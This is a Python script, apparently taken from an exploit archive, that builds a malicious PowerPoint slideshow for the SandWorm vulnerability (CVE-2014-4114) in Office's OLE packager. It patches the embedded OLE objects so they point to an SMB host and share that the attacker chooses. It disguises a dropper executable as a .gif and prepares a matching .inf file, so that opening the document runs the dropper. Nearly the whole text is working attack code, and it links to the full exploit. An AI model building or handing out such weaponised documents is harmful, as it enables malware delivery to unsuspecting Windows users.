#!/usr/bin/env python
import os
import zipfile
import sys

'''
Full Exploit: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/35019.tar.gz

Very quick and ugly [SandWorm CVE-2014-4114] exploit builder
Exploit Title: CVE-2014-4114 SandWorm builder
Built to run on: Linux/MacOSX
Date: 17/10/2014
Exploit Author: Vlad Ovtchinikov (@v1ad_o)
Vendor Homepage: microsoft.com
Tested on: Win7Sp1 64 bit  - Microsoft Offcie 2013 Plus
Demo: http://youtu.be/ljjEkhflpvM
CVE : CVE-2014-4114
NOTE:
expl.inf (md5 8313034e9ab391df83f6a4f242ec5f8d) + expl.zip (md5 4a39121a60cc79d211fc7f7cfe00b707)
should be located in the same  dir as the builder.
01:39 cve-2014-4114.py
19:35 expl.inf
15:37 expl.zip

e.g.  python cve-2014-4114.py 10.0.0.233 rdb xxx.exe
10.0.0.233 - ip
rdb - share
xxx.exe - dropper
'''
host=sys.argv[1]
share=sys.argv[2]
mal_file=sys.argv[3]

print "\nPoC exploit builder v0.1 for logical OLE flaw in packager.dll [CVE-2014-4114] by vlad@sensepost.com @v1ad_o\n"
print "Building ... \n "

# extract the original .ppsx PoC
mal_file= mal_file.replace(' ', '')[:-4].lower()
fh = open('expl.zip', 'rb')
z = zipfile.ZipFile(fh)
for name in z.namelist():
    outpath = "./tmp"
    z.extract(name, outpath)
fh.close()

os.mkdir('out')
os.chdir('tmp')

# oleObject1.bin mod for GIF
infile = open('ppt/embeddings/oleObject1.bin')
outfile = open('ppt/embeddings/1.bin','w')
replacements = {'10.0.0.34':host,'public':share,'slide1.gif':mal_file+'.gif'}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()
os.remove ('ppt/embeddings/oleObject1.bin')
os.rename ('ppt/embeddings/1.bin','ppt/embeddings/oleObject1.bin')

# oleObject2.bin mod for INF
infile = open('ppt/embeddings/oleObject2.bin')
outfile = open('ppt/embeddings/2.bin','w')
replacements = {'10.0.0.34':host,'public':share,'slide1.inf':mal_file+'.inf'}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()

os.remove ('ppt/embeddings/oleObject2.bin')
os.rename ('ppt/embeddings/2.bin','ppt/embeddings/oleObject2.bin')
os.system("zip -q  -9 -r  ../out/exploit.ppsx * ")
os.chdir('..')

# oleObject2.bin mod for INF prep
infile = open('expl.inf')
outfile = open('out/'+mal_file+'.inf','w')
replacements = {'slide1':mal_file}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()
os.system("rm -rf tmp")

print 'Copy the .inf .gif (renamed file.exe=>file.gif) to:\n'
print '*\\\\'+host +'\\'+ share +'\\'+ mal_file+'.gif\n'
print '*\\\\'+host +'\\'+ share +'\\'+ mal_file+'.inf\n'
print 'Done - collect your files from the [out] folder.\n'